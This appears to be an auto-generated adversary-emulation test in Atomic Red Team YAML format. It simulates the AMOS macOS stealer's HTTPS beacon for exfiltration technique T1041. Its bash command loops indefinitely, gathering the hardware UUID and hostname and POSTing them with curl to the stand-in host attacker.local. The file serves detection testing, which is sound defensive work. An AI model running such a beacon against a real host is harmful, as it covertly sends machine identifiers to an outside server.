# Auto-generated by CIPHER v5.0
# Source: 5c9fca5e05c4
attack_technique: T1041
display_name: "T1041 - macOS HTTPS Beacon to C2"
atomic_tests:
  - name: "T1041 - macOS HTTPS Beacon to C2"
    description: |
      Simulate periodic HTTPS beacon used by AMOS to exfiltrate stolen data.
    supported_platforms:
      - macos
    executor:
      name: bash
      command: |
        while true; do UUID=$(system_profiler SPHardwareDataType | awk '/UUID/ {print $3}'); HOST=$(hostname); DATA=$(base64 /dev/null); curl -sk -X POST https://attacker.local/api/v1/report -H "Content-Type: application/json" -d "{\"uuid\":\"$UUID\",\"host\":\"$HOST\",\"data\":\"$DATA\"}"; sleep $((300 + RANDOM % 60 - 30)); done
      cleanup_command: |
        pkill -f "curl -sk -X POST https://attacker.local/api/v1/report" || true
